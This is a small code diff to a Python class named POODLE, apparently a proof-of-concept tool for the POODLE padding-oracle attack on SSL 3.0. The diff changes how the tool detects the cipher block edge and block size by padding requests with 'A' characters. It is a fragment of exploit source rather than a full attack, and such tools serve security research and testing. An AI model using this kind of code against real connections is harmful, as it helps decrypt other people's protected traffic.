@@ -76,15 +76,10 @@ class POODLE(object):
 
     for i in range(16):
       msg = self.trigger('A'*i)
-      if len(msg) != reference:
+      self.block_size = len(msg) - reference
+      if self.block_size != 0:
         self.block_edge = i
         break
 
-    reference = len(self.trigger('A'*(self.block_edge)))
-    for i in range(self.block_edge, self.block_edge+17):
-      msg = self.trigger('A'*i)
-      if len(msg) != reference:
-        self.block_size = i-self.block_edge
-        break
     return
 
